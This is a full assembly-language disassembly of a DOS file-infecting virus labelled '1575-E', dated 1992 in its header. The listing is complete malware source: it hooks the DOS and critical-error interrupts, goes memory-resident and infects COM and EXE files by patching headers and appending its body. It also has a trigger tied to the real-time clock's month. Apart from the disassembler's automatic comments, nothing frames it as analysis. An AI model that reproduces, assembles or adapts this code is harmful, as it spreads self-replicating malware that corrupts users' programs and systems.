
PAGE  59,132

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€								         €€
;€€			        1575-E				         €€
;€€								         €€
;€€      Created:   23-May-92					         €€
;€€      Passes:    5	       Analysis Options on: none	         €€
;€€								         €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

data_1e		equ	6
data_2e		equ	84h
data_3e		equ	86h
data_4e		equ	100h
data_10e	equ	31Fh
data_12e	equ	0			;*
data_13e	equ	3			;*
data_14e	equ	12h			;*
data_15e	equ	0
data_55e	equ	0FA0h
data_56e	equ	6B0h
data_57e	equ	725h

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

1575-e		proc	far

start:
		jmp	short loc_4
		db	90h
data_17		dw	0B2Bh, 103Eh
data_19		dw	0FF53h
data_20		dw	0F000h
data_21		db	0B4h
		db	2
data_22		dw	2AB2h
data_23		dw	21CDh
		db	0CDh, 20h
data_24		dw	0E5h
		db	 3Dh, 02h,0FFh,0FFh
data_25		dw	50Fh
data_26		dw	100h
                db       26h,0D9h
data_27		dw	100h
data_28		dw	50Fh
data_29		dw	480h
data_30		dw	0
data_31		dw	0
data_32		dw	53F0h
data_33		dw	5
data_34		dw	648Ch
data_35		dw	789Fh
data_36		dw	480h
data_37		dw	0BD1h
data_38		dw	1213h
data_39		dw	0EA2h
data_40		dw	5BFh
data_41		db	4Dh
data_42		db	31h
		db	 68h, 7Dh, 02h,0FBh, 07h
		db	 70h, 00h

loc_ret_2:
		retn
		db	0E2h, 00h
		db	0F0h,0FBh, 07h, 70h, 00h
loc_4:
		push	es
		push	ds
		mov	ax,es
		push	cs
		pop	ds
		push	cs
		pop	es
		mov	data_38,ax
		mov	ax,ss
		mov	data_33,ax
		std				; Set direction flag
		mov	ax,7076h
		cld				; Clear direction
		xor	ax,ax			; Zero register
		mov	ds,ax
		xor	si,si			; Zero register
		mov	di,offset data_42
		mov	cx,10h
		repne	movsb			; Rep zf=0+cx >0 Mov [si] to es:[di]
		push	ds
		pop	ss
		mov	bp,8
		xchg	bp,sp
		call	sub_2
		jmp	loc_27
loc_5:
		call	sub_13
		call	sub_3
		jz	loc_6			; Jump if zero
		mov	al,data_53
		push	ax
		call	sub_4
		pop	ax
		mov	data_53,al
		jmp	short loc_7
		db	90h
loc_6:
		call	sub_6
		call	sub_7
		cmp	byte ptr data_53,0
		jne	loc_7			; Jump if not equal
		mov	ax,4C00h
		int	21h			; DOS Services  ah=function 4Ch
						;  terminate with al=return code
loc_7:
		cmp	byte ptr data_53,43h	; 'C'
		jne	loc_10			; Jump if not equal
loc_8:
		pop	ds
		pop	es
		push	cs
		pop	ds
		pop	es
		push	es
		mov	di,data_4e
		mov	si,offset data_21
		mov	cx,0Ch
		repne	movsb			; Rep zf=0+cx >0 Mov [si] to es:[di]
		push	es
		pop	ds
		mov	ax,100h
		push	ax
		xor	ax,ax			; Zero register
		retf				; Return far

1575-e		endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_2		proc	near
		mov	si,data_1e
		lodsw				; String [si] to ax
		cmp	ax,192h
		je	loc_8			; Jump if equal
		cmp	ax,179h
		jne	loc_9			; Jump if not equal
		jmp	loc_12
loc_9:
		cmp	ax,1DCh
		je	loc_10			; Jump if equal
		retn
loc_10:
		pop	ds
		pop	es
		mov	bx,cs:data_25
		sub	bx,cs:data_36
		mov	ax,cs
		sub	ax,bx
		mov	ss,ax
		mov	bp,cs:data_37
		xchg	bp,sp
		mov	bx,cs:data_28
		sub	bx,cs:data_29
		mov	ax,cs
		sub	ax,bx
		push	ax
		mov	ax,cs:data_30
		push	ax
		retf				; Return far
data_43		db	23h
		db	1Ah
		db	'<#/--!.$'
		db	 0Eh, 23h, 2Fh, 2Dh,0E0h
data_44		db	'A:MIO.COM', 0
		db	 58h, 45h, 00h, 00h, 00h
		db	 24h, 24h, 24h, 24h, 24h

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_3:
		mov	ax,3D02h
		mov	dx,offset data_44	; ('A:MIO.COM')
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jnc	loc_11			; Jump if carry=0
		clc				; Clear carry flag
		retn
loc_11:
		mov	data_33,ax
		mov	dx,offset int_24h_entry
		mov	ax,2524h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		mov	ax,4202h
		mov	bx,data_33
		mov	cx,0FFFFh
		mov	dx,0FFFEh
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	dx,offset data_45
		mov	ah,3Fh			; '?'
		mov	bx,data_33
		mov	cx,2
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		push	ds
		mov	dx,data_40
		mov	ax,data_39
		mov	ds,ax
		mov	ax,2524h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		pop	ds
		cmp	data_45,0A0Ch
		clc				; Clear carry flag
		retn
data_45		dw	20CDh
loc_12:
		cmp	ax,22Dh
		je	loc_13			; Jump if equal
		push	ds
		pop	es
		push	cs
		pop	ds
		mov	ax,data_33
		mov	ss,ax
		xchg	bp,sp
		mov	si,offset data_42
		mov	di,data_15e
		mov	cx,10h
		cld				; Clear direction
		repne	movsb			; Rep zf=0+cx >0 Mov [si] to es:[di]
		jmp	loc_5
sub_2		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_4		proc	near
loc_13:
		mov	al,43h			; 'C'
		mov	data_53,al
		mov	al,8
		out	70h,al			; port 70h, RTC addr/enabl NMI
						;  al = 8, month register
		in	al,71h			; port 71h, RTC clock/RAM data
		mov	data_41,al
		mov	dx,offset data_44	; ('A:MIO.COM')
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jnc	loc_14			; Jump if carry=0
		retn
loc_14:
		mov	data_33,ax
		mov	dx,offset data_21
		mov	bx,data_33
		mov	cx,0Ch
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		push	ax
		add	ax,10h
		and	ax,0FFF0h
		push	ax
		shr	ax,1			; Shift w/zeros fill
		shr	ax,1			; Shift w/zeros fill
		shr	ax,1			; Shift w/zeros fill
		shr	ax,1			; Shift w/zeros fill
		mov	di,data_10e
		stosw				; Store ax to es:[di]
		pop	ax
		pop	bx
		sub	ax,bx
		mov	cx,627h
		add	cx,ax
		mov	dx,100h
		sub	dx,ax
		mov	bx,data_33
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	ax,4200h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	ah,40h			; '@'
		mov	bx,data_33
		mov	cx,0Ch
		mov	dx,offset data_46
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	ah,3Eh			; '>'
		mov	bx,data_33
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		retn
sub_4		endp

data_46		db	0Eh
		db	 8Ch,0C8h, 05h, 01h, 00h, 50h
		db	0B8h, 00h, 01h, 50h,0CBh

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_5		proc	near
		mov	al,45h			; 'E'
		mov	data_53,al
		mov	al,8
		out	70h,al			; port 70h, RTC addr/enabl NMI
						;  al = 8, month register
		in	al,71h			; port 71h, RTC clock/RAM data
		mov	data_41,al
		mov	dx,offset data_44	; ('A:MIO.COM')
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jnc	loc_15			; Jump if carry=0
		retn
loc_15:
		mov	data_33,ax
		mov	dx,offset data_21
		mov	bx,data_33
		mov	cx,18h
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		mov	ax,4202h
		mov	cx,0
		mov	dx,0
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		push	ax
		add	ax,10h
		adc	dx,0
		and	ax,0FFF0h
		mov	data_31,dx
		mov	data_32,ax
		mov	cx,727h
		sub	cx,100h
		add	ax,cx
		adc	dx,0
		mov	cx,200h
		div	cx			; ax,dx rem=dx:ax/reg
		inc	ax
		mov	data_23,ax
		mov	data_22,dx
		mov	ax,data_28
		mov	data_29,ax
		mov	ax,data_27
		mov	data_30,ax
		mov	ax,data_25
		mov	data_36,ax
		mov	ax,data_26
		mov	data_37,ax
		mov	dx,data_31
		mov	ax,data_32
		mov	cx,10h
		div	cx			; ax,dx rem=dx:ax/reg
		sub	ax,10h
		sub	ax,data_24
		mov	data_28,ax
		mov	data_25,ax
		mov	data_27,100h
		mov	data_26,100h
		mov	ax,4200h
		xor	cx,cx			; Zero register
		mov	dx,2
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	dx,offset data_22
		mov	bx,data_33
		mov	cx,16h
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	dx,100h
		mov	ax,data_32
		pop	cx
		sub	ax,cx
		sub	dx,ax
		mov	cx,727h
		add	cx,ax
		sub	cx,100h
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		retn
sub_5		endp

		push	cx
		mov	cx,0
		mov	ah,4Eh			; 'N'
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		pop	cx
		retn

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_6		proc	near
		push	es
		mov	ax,351Ch
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	cs:data_19,bx
		mov	cs:data_20,es
		mov	ax,3521h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		push	es
		pop	ax
		mov	word ptr cs:data_17+2,ax
		mov	cs:data_17,bx
		pop	es
		retn
sub_6		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_7		proc	near
		push	ax
		push	es
		push	ds
		xor	ax,ax			; Zero register
		mov	es,ax
		mov	si,data_3e
		mov	ax,es:[si]
		mov	ds,ax
		mov	si,data_57e
		cmp	word ptr [si],0A0Ch
		jne	loc_16			; Jump if not equal
		push	ds
		pop	ax
		call	sub_14
		pop	ds
		pop	es
		pop	ax
		retn
loc_16:
		push	cs
		pop	ds
		mov	ax,data_38
		dec	ax
		mov	es,ax
		cmp	byte ptr es:data_12e,5Ah	; 'Z'
		nop				;*ASM fixup - sign extn byte
		je	loc_17			; Jump if equal
		jmp	short loc_18
		db	90h
loc_17:
		mov	ax,es:data_13e
		mov	cx,737h
		shr	cx,1			; Shift w/zeros fill
		shr	cx,1			; Shift w/zeros fill
		shr	cx,1			; Shift w/zeros fill
		shr	cx,1			; Shift w/zeros fill
		sub	ax,cx
		jc	loc_18			; Jump if carry Set
		mov	es:data_13e,ax
		sub	es:data_14e,cx
		push	cs
		pop	ds
		mov	ax,es:data_14e
		push	ax
		pop	es
		mov	si,100h
		push	si
		pop	di
		mov	cx,627h
		cld				; Clear direction
		repne	movsb			; Rep zf=0+cx >0 Mov [si] to es:[di]
		push	es
		sub	ax,ax
		mov	es,ax
		mov	si,data_2e
		mov	dx,4A8h
		mov	es:[si],dx
		inc	si
		inc	si
		pop	ax
		mov	es:[si],ax
loc_18:
		pop	ds
		pop	es
		pop	ax
		retn
sub_7		endp

		cmp	al,57h			; 'W'
		jne	loc_19			; Jump if not equal
		jmp	short loc_22
		db	90h
loc_19:
		cmp	ah,1Ah
		jne	loc_20			; Jump if not equal
		call	sub_12
		jmp	short loc_22
		db	90h
loc_20:
		cmp	ah,11h
		jne	loc_21			; Jump if not equal
		call	sub_8
		iret				; Interrupt return
loc_21:
		cmp	ah,12h
		jne	loc_22			; Jump if not equal
		call	sub_11
		iret				; Interrupt return
loc_22:
		jmp	dword ptr cs:data_17

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_8		proc	near
		mov	al,57h			; 'W'
		int	21h			; DOS Services  ah=function 00h
						;  terminate, cs=progm seg prefx
		push	ax
		push	cx
		push	dx
		push	bx
		push	bp
		push	si
		push	di
		push	ds
		push	es
		push	cs
		pop	ds
		push	cs
		pop	es
		mov	byte ptr cs:data_47,0
		nop
		call	sub_9
		jnz	loc_23			; Jump if not zero
		call	sub_3
		jz	loc_23			; Jump if zero
		call	sub_16
		dec	data_47
loc_23:
		pop	es
		pop	ds
		pop	di
		pop	si
		pop	bp
		pop	bx
		pop	dx
		pop	cx
		pop	ax
		retn
sub_8		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_9		proc	near
		push	cs
		pop	es
		push	cs
		pop	es
		cld				; Clear direction
		call	sub_10
		jnc	loc_24			; Jump if carry=0
		cmp	di,0
		retn
loc_24:
		mov	di,offset data_44	; ('A:MIO.COM')
		mov	al,2Eh			; '.'
		mov	cx,0Bh
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		cmp	word ptr [di],4F43h
		jne	loc_25			; Jump if not equal
		cmp	byte ptr [di+2],4Dh	; 'M'
		jne	loc_25			; Jump if not equal
		mov	byte ptr data_53,43h	; 'C'
		nop
		retn
loc_25:
		cmp	word ptr [di],5845h
		jne	loc_ret_26		; Jump if not equal
		cmp	byte ptr [di+2],45h	; 'E'
		jne	loc_ret_26		; Jump if not equal
		mov	byte ptr data_53,45h	; 'E'
		nop

loc_ret_26:
		retn
sub_9		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_10		proc	near
loc_27:
		push	ds
		mov	si,cs:data_34
		mov	ax,cs:data_35
		mov	ds,ax
		mov	di,offset data_44	; ('A:MIO.COM')
		lodsb				; String [si] to al
		cmp	al,0FFh
		jne	loc_28			; Jump if not equal
		add	si,6
		lodsb				; String [si] to al
		jmp	short loc_29
		db	90h
loc_28:
		cmp	al,5
		jb	loc_29			; Jump if below
		pop	ds
		stc				; Set carry flag
		retn
loc_29:
		mov	cx,0Bh
		cmp	al,0
		je	locloop_30		; Jump if equal
		add	al,40h			; '@'
		stosb				; Store al to es:[di]
		mov	al,3Ah			; ':'
		stosb				; Store al to es:[di]

locloop_30:
		lodsb				; String [si] to al
		cmp	al,20h			; ' '
		je	loc_31			; Jump if equal
		stosb				; Store al to es:[di]
		jmp	short loc_32
		db	90h
loc_31:
		cmp	byte ptr es:[di-1],2Eh	; '.'
		je	loc_32			; Jump if equal
		mov	al,2Eh			; '.'
		stosb				; Store al to es:[di]
loc_32:
		loop	locloop_30		; Loop if cx > 0

		mov	al,0
		stosb				; Store al to es:[di]
		pop	ds
		clc				; Clear carry flag
		retn
sub_10		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_11		proc	near
		mov	al,57h			; 'W'
		int	21h			; DOS Services  ah=function 00h
						;  terminate, cs=progm seg prefx
		push	ax
		push	cx
		push	dx
		push	bx
		push	bp
		push	si
		push	di
		push	ds
		push	es
		push	cs
		pop	ds
		push	cs
		pop	es
		cmp	byte ptr cs:data_47,0
		je	loc_33			; Jump if equal
		jmp	short loc_34
		db	90h
loc_33:
		call	sub_9
		jnz	loc_34			; Jump if not zero
		call	sub_3
		jz	loc_34			; Jump if zero
		call	sub_16
		dec	data_47
		pop	es
		pop	ds
		pop	di
		pop	si
		pop	bp
		pop	bx
		pop	dx
		pop	cx
		pop	ax
		retn
loc_34:
		pop	es
		pop	ds
		pop	di
		pop	si
		pop	bp
		pop	bx
		pop	dx
		pop	cx
		pop	ax
		retn
sub_11		endp

data_47		db	0

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_12		proc	near
		push	ax
		push	ds
		pop	ax
		mov	cs:data_35,ax
		mov	cs:data_34,dx
		pop	ax
		retn
sub_12		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_13		proc	near
		push	cs
		mov	al,0
		out	20h,al			; port 20h, 8259-1 int command
		mov	ax,3524h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	data_40,bx
		mov	bx,es
		mov	data_39,bx
		pop	es
		mov	si,offset data_43
		mov	di,offset data_44	; ('A:MIO.COM')
		mov	cx,0Fh

locloop_35:
		lodsb				; String [si] to al
		add	al,20h			; ' '
		stosb				; Store al to es:[di]
		loop	locloop_35		; Loop if cx > 0

		retn
sub_13		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_14		proc	near
		push	ax
		push	cs
		pop	ds
		push	cs
		pop	es
		mov	bl,data_41
		cmp	bl,0Ch
		ja	loc_37			; Jump if above
		cmp	bl,0
		je	loc_37			; Jump if equal
		mov	al,8
		out	70h,al			; port 70h, RTC addr/enabl NMI
						;  al = 8, month register
		in	al,71h			; port 71h, RTC clock/RAM data
		cmp	al,0Ch
		ja	loc_37			; Jump if above
		cmp	al,0
		je	loc_37			; Jump if equal
		cmp	al,bl
		je	loc_37			; Jump if equal
		inc	bl
		call	sub_15
		cmp	al,bl
		je	loc_37			; Jump if equal
		inc	bl
		call	sub_15
		cmp	al,bl
		je	loc_37			; Jump if equal
		pop	ds
		call	sub_17
		push	cs
		pop	ds
		retn

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_15:
		cmp	bl,0Ch
		jbe	loc_ret_36		; Jump if below or =
		sub	bl,0Ch

loc_ret_36:
		retn
loc_37:
		pop	ax
		retn
sub_14		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_16		proc	near
		mov	dx,offset int_24h_entry
		mov	ax,2524h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		cmp	byte ptr data_53,43h	; 'C'
		jne	loc_38			; Jump if not equal
		call	sub_4
		jmp	short loc_39
		db	90h
loc_38:
		call	sub_5
loc_39:
		push	ds
		mov	dx,data_40
		mov	ax,data_39
		mov	ds,ax
		mov	ax,2524h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		pop	ds
		retn
sub_16		endp


;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;
;			External Entry Point
;
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

int_24h_entry	proc	far
		mov	al,3
		iret				; Interrupt return
int_24h_entry	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
